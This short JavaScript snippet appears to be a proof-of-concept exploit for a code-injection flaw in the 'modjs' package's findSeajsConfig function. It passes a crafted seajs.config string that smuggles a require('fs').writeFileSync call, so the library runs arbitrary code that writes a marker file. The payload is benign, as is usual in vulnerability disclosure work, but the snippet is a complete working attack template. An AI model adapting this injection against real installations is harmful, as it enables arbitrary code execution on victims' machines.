const sea = require("./node_modules/modjs/lib/utils/sea");
sea.findSeajsConfig("seajs.config({a: require('fs').writeFileSync('./modjs-success.txt', '23')})");